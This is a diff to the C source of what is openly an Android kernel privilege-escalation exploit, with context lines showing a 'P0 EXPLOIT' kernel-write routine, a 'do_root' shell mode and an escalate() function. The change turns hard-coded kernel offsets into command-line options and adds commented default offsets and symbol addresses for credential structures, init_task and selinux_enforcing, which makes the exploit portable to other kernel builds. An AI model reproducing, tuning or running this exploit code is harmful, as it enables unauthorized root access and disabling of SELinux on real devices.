@@ -228,14 +228,44 @@ void kernel_write_uint(unsigned long kaddr, unsigned int data) {
 /// END P0 EXPLOIT ///
 
 void usage() {
-  char * name = "do_root";
-  printf("usage: %s [shell|shell_exec]\n"
-      "%s shell - spawns an interactive shell\n"
-      "%s shell_exec \"command\" - runs the provided command in an escalated shell\n",
-      name, name, name
-  );
+	printf("Usage:\n");
+	printf(" -a   OFFSET__task_struct__thread_info__flags\n");
+	printf(" -b   OFFSET__task_struct__mm\n");
+	printf(" -c   OFFSET__task_struct__cred\n");
+	printf(" -d   OFFSET__mm_struct__user_ns\n");
+	printf(" -e   OFFSET__uts_namespace__name__version\n");
+	printf(" -f   OFFSET__task_struct__cred__secbits\n");
+	printf(" -g   OFFSET__task_struct__cred__caps\n");
+	printf(" -h   OFFSET__task_struct__cred__secptr\n");
+	printf(" -i   SYMBOL__init_user_ns\n");
+	printf(" -j   SYMBOL__init_task\n");
+	printf(" -k   SYMBOL__init_uts_ns\n");
+	printf(" -l   SYMBOL__selinux_enforcing\n");
+	printf(" -m   NUM__task_struct__cred__ids\n");
+	printf(" -n   command\n\nExample run:\n");
+  printf("./executable -a 0x4 -b 0x521 -c 0x791 -d 0x301 -n busybox\n");
+  printf("NOTE THAT in the above command: -n is MANDATORY, it runs \"busybox\" command and a,b,c,d now have different values and other variables(e,f,g...) remain the same as default\n");
   exit(1);
 }
+
+/*
+unsigned long OFFSET__task_struct__thread_info__flags=0;
+unsigned long OFFSET__task_struct__mm=0x520;
+unsigned long OFFSET__task_struct__cred=0x790;
+unsigned long OFFSET__mm_struct__user_ns=0x300;
+unsigned long OFFSET__uts_namespace__name__version=0xc7;
+unsigned long OFFSET__task_struct__cred__secbits=0x24;
+unsigned long OFFSET__task_struct__cred__caps=0x30;
+unsigned long OFFSET__task_struct__cred__secptr=0x78;
+// SYMBOL_* are relative to _head; data from /proc/kallsyms on userdebug
+unsigned long SYMBOL__init_user_ns=0x202f2c8;
+unsigned long SYMBOL__init_task=0x20257d0;
+unsigned long SYMBOL__init_uts_ns=0x20255c0;
+
+unsigned long SYMBOL__selinux_enforcing=0x23ce4a8; // Grant: recovered using droidimg+miasm
+
+unsigned long NUM__task_struct__cred__ids=8; // Number of ID fields in cred struct
+*/
 
 void escalate()
 {
